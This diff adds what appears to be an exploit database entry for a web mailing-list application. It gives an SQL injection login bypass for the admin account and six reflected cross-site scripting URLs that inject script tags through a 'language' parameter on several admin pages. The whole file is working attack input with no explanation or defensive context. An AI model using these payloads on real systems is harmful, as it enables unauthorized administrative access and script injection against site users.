@@ -1,0 +1,9 @@
+login:admin &#039; or 1=1/*
+password:whatever
+
+http://www.example.com/[path]/page/showcirculation.php?language=&lt;script&gt;alert(1111)&lt;/script&gt;
+http://www.example.com/[path]/pages/edittemplate_step2.php?language=&lt;script&gt;alert(1111)&lt;/script&gt;
+http://www.example.com/[path]//pages/showfields.php?language=&lt;script&gt;alert(1111)&lt;/script&gt;
+http://www.example.com/[path]//pages/showuser.php?language=&lt;script&gt;alert(1111)&lt;/script&gt;
+http://www.example.com/[path]//pages/editmailinglist_step1.php?language=&lt;script&gt;alert(222)&lt;/script&gt;
+http://www.example.com/[path]//pages/showtemplates.php?language=&lt;script&gt;alert(1111)&lt;/script&gt;
